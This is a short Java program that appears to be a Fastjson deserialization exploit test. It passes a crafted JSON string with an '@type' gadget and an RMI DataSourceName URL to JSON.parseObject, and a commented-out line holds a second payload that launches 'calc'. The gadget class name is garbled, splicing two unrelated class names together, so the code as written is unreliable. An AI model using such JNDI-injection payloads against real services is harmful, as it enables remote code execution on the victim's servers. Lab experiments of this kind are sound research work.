package com.yyjccc;

import com.alibaba.fastjson.JSON;


public class App

{
    public static void main( String[] args )
    {
      // String json="{\"age\":18}";
        //String s="{\"@type\":\"org.example.enity.Test\",\"cmd\":\"calc\"}";
      String s="{\"@type\":\"com.sun.roworg.apache.commons.dbcp.BasicDataSourceset.JdbcRowSetImpl\",\"DataSourceName\":\"rmi://127.0.0.1:8085/RFKMphyY\",\"AutoCommit\":false}";

       Object o=JSON.parseObject(s);

        System.out.println(s);

    }
}
